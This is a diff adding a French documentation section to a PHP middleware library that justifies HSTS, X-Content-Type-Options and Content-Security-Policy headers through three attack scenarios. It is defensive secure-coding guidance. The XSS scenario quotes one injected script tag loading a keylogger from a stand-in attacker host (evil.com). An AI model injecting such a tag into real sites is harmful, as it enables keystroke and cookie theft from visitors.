@@ -1,5 +1,17 @@
 # En-têtes de sécurité
 
+## Pourquoi tu en aurais besoin — trois scénarios concrets
+
+**Cookie de session volé.** Ton utilisateur se connecte à ton interface d'administration depuis le wifi d'un hôtel. Le point d'accès downgrade sa connexion en HTTP pendant deux secondes lors de la résolution DNS initiale. Le navigateur envoie le cookie de session en clair. Un attaquant sur le même réseau le capture, le rejoue, prend le contrôle de la session. Avec **HSTS** (`Strict-Transport-Security: max-age=31536000`), le navigateur refuse tout downgrade HTTP pendant l'année qui suit — la requête reste HTTPS ou échoue net.
+
+**Un « harmless.jpg » uploadé qui s'exécute comme du JavaScript.** Tu laisses les utilisateurs uploader des avatars. Un attaquant upload un fichier dont les octets sont du JavaScript valide avec une extension `.jpg`. Quand le navigateur d'une victime récupère l'avatar, ton CDN le sert sans `Content-Type`, le navigateur sniffe le contenu, y voit du JS, l'exécute dans le contexte de ton origine — session piratée. Avec `X-Content-Type-Options: nosniff`, le navigateur est forcé d'utiliser le MIME-type déclaré et refuse d'exécuter du contenu non-JS.
+
+**Un seul `<script>` injecté contamine tous les visiteurs.** Un utilisateur poste un commentaire contenant `<script src="https://evil.com/keylogger.js"></script>`. Sans **Content-Security-Policy** stricte, le navigateur de chaque visiteur charge et exécute ce script — keyloggers, vol de cookies, téléchargements drive-by. Avec `default-src 'self'`, le navigateur refuse de charger tout script qui ne vient pas de ton origine.
+
+Chacun de ces en-têtes est un interrupteur côté serveur d'une seule ligne qui bloque toute une classe d'attaques navigateur. Les helpers ci-dessous les appliquent en un seul appel avec des valeurs typées — pas de chaîne magique, pas de directive à oublier.
+
+---
+
 `oihana/php-middleware` fournit trois helpers procéduraux pour appliquer les en-têtes de sécurité HTTP les plus courants sur une réponse PSR-7 :
 
 - [`withSecurityHeaders()`](#withsecurityheaders) — le point d'entrée unique qui applique HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Content-Security-Policy, les trois en-têtes Cross-Origin (COOP / COEP / CORP) et Permissions-Policy en un seul appel.
